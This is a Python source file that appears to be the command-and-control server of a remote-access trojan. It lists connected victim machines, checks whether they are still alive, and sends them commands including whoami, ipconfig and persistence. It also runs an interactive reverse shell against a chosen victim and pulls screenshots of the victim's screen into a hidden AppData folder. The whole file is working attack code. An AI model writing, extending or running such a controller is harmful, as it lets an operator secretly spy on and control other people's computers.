from socket import *
import os
import time

BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "exit"]
USERNAME = os.getlogin() #Gets the PC User.

#List Clients
def list_of_clients(clients):
    """Function the list all conncted clients on the server"""
    if (not clients):
        print("List of clients is empty")
        time.sleep(1)
    else:
        check_if_still_conncted(clients) #Checks if client is still conncted to the server
        try:
            print("\nList of Clients:")
            for item in clients: 
                ip = item[1]
                print("{0}".format(ip[0])) #Gets the IP of all the clients to show it on console
            print("")
        except:
            print("error")

#Check Conncted Clients
def check_if_still_conncted(clients):
    """This part checks if the client is still conncted"""
    while True:
        try:
            for x in range(0, len(clients)):
                clients[x][0].sendall("alive?".encode()) #Sends a msg to client and waits for respond
                clients[x][0].recv(BUFFER_SIZE).decode() #If he responds = alive, if not = dead.
            break
        except:
            clients.remove(clients[x]) # remove him for client list if dead

#Choose Command to send to client
def choose_command():
    """Function that lists all the avilable commands, and checks if the input is currect"""
    while True:
        print("")
        #List all the possible commands
        for i in range(0, len(COMMANDS)):
            print(f"[{i}] " + COMMANDS[i]) 
        #Select a command, if its valid then continue, if not, try again.
        try:
            command = int(input("\n[!] Select a command:> "))
            if command < len(COMMANDS):
                return COMMANDS[command]
            else:
                print(str(command) + " Command Was not found")
                time.sleep(1)
        except:
            print("Invalid Input")


#Handle all server req
def run_commands(clients):
    """
    Function that runs the server commands,
    First check if threre is any clients,
    And then wating for server to choose which command to run
    After that the server need to input IP address of client.
    """
    try:
        if(not clients):
            print("Can't send commands to an empty list of clients")
        else:
            client = check_if_ip_exists(clients)  # Select Client
            if (client != "-1"):
                while True:
                    command = choose_command()  # Select Command
                    if (command == "exit"):
                        break
                    if command == "reverse_shell":
                        reverse_shell(client, command) #Start revese shell
                        continue
                    if command == "screenshot":
                        screenshot(client, command) #Take screenshot
                        continue
                    else:
                        #if not any of the above just the input from the server and wait for respond
                        client.sendall(command.encode()) 
                        print(client.recv(BUFFER_SIZE).decode())
                        time.sleep(1)
    except Exception as e:
        print("Error ", e)

#Check IP
def check_if_ip_exists(clients):
    """This checks if the ip are indeed exists in the server"""
    list_of_ips = []
    #Gets all the IPs of clients that conncted to server and adds them to a list.
    for item in clients:
        list_of_ips.append(item[1][0]) 

    while True:
        list_of_clients(clients) #Show Conncted clients
        ip = input("[?] Client IP: ")
        if (ip == "-1"): #To quit
            return ip
        else:
            #This checks if the ip that enterd are indeed in the list of list_of_ips
            for x in range(0, len(list_of_ips)):
                if ip == list_of_ips[x]:
                    return clients[x][0]    #If ip is in list, return it.
        print("\n" + '\033[31m' + "IP not found!" +
              '\033[0m' + "(Type -1 to quit)")
        print("List of Conncted Clients: " + str(list_of_ips))


def createTempFolder():
    global USERNAME
    try:
        os.mkdir(f"C:/Users/{USERNAME}/AppData/Roaming/TempFiles")
    except Exception as e:
        pass

#Take ScreenShot
def screenshot(client, command):
    """Function that captures client screen and send it to server."""
    client.sendall(command.encode()) #send him the command
    filename = client.recv(BUFFER_SIZE).decode()  # receive the file name
    filename = os.path.basename(filename)  # remove absolute path if there is
    filename = f"C:/Users/{USERNAME}/AppData/Roaming/TempFiles/{filename}" #path to save the img
    with open(filename, "wb") as f:
        while True:
            bytes_read = client.recv(BUFFER_SIZE)
            if bytes_read == b"11111111": #if the client sends 11111111 in bits, stop.
                break
            f.write(bytes_read)
    print(f"Screenshot saved in: {filename}")
    time.sleep(1)


#Get Reverse_$hell
def reverse_shell(client, command):
    """Function manage all communication of the reverse shell with the client"""
    client.sendall(command.encode())
    while True:
        string = input(client.recv(BUFFER_SIZE).decode())
        if string == "quit":
            client.sendall("quit".encode())
            break
        else:
            client.sendall(string.encode())
